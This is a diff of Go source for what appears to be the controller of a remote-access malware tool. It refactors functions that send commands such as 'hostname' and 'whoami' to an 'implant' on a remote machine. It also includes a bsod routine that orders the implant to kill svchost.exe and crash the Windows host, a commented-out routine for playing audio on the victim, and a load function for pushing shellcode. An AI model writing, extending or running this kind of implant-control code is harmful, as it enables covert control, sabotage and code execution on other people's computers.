@@ -32,7 +32,6 @@ L: //Labeled the for loop with L if i need to break it from switch. Faster than 
 			break L
 		default:
 			(*conn).Write([]byte(command))
-			//time.Sleep(1 * time.Second) Ma ila 3azeh only for testing
 			request := make([]byte, 9000)
 			read_len, err := (*conn).Read(request)
 			if read_len == 0 {
@@ -48,35 +47,35 @@ L: //Labeled the for loop with L if i need to break it from switch. Faster than 
 	}
 }
 
-func hostinfo(conn *net.Conn) {
+func hostinfo(conn *net.Conn) (string, string) {
 	fmt.Println()
 	(*conn).Write([]byte("hostname\n"))
 	request := make([]byte, 9000)
 	read_len, err := (*conn).Read(request)
 	if read_len == 0 {
-		fmt.Println("Read Length is 0")
+		fmt.Println("[-]Read Length is 0")
+		return "ERROR", "ERROR"
 	}
 	if err != nil {
-		os.Exit(0)
+		fmt.Println("[-]Error with reading from buffer")
+		return "ERROR", "ERROR"
 	}
 	hostname := string(request[:read_len])
 	(*conn).Write([]byte("whoami\n"))
 	read_len, err = (*conn).Read(request)
 	if read_len == 0 {
-		fmt.Println("Read Length is 0")
+		fmt.Println("[-]Read Length is 0")
+		return "ERROR", "ERROR"
 	}
 	if err != nil {
-		os.Exit(0)
+		fmt.Println("[-]Error with reading from buffer")
+		return "ERROR", "ERROR"
 	}
 	whoami := string(request[:read_len])
-	fmt.Print("Hostname: " + hostname) //Hostname gets recieved with \n so we can leave it this way
-	fmt.Println("User: " + whoami)
+	return hostname, whoami
 }
 
 func bsod(conn *net.Conn) bool { //Works but implant should be running as admin
-	// fmt.Println("Initiating BSOD by killing")
-	// (*conn).Write([]byte("taskkill.exe /f /im svchost.exe"))
-	// fmt.Println("Kill Signal Sent")
 	fmt.Println("[!]Initiating BSOD by killing svchost.exe")
 	(*conn).Write([]byte("SelfDestruct\n"))
 	fmt.Println("[+]Kill Signal Sent")
@@ -100,16 +99,16 @@ func bsod(conn *net.Conn) bool { //Works but implant should be running as admin
 	return true
 }
 
-func playAudio(conn *net.Conn, audioFile string) {
-	fmt.Println("Playing audio on the remote host :)")
-	contents, err := os.ReadFile("Audio/" + audioFile)
-	if err != nil {
-		fmt.Println("Couldn't read the file !")
-		return
-	}
-	(*conn).Write([]byte("play\n"))
-	(*conn).Write(contents)
-}
+// func playAudio(conn *net.Conn, audioFile string) {
+// 	fmt.Println("Playing audio on the remote host :)")
+// 	contents, err := os.ReadFile("Audio/" + audioFile)
+// 	if err != nil {
+// 		fmt.Println("Couldn't read the file !")
+// 		return
+// 	}
+// 	(*conn).Write([]byte("play\n"))
+// 	(*conn).Write(contents)
+// }
 
 func load(conn *net.Conn, fileWShellcode string) {
 	fmt.Println("Good luck")
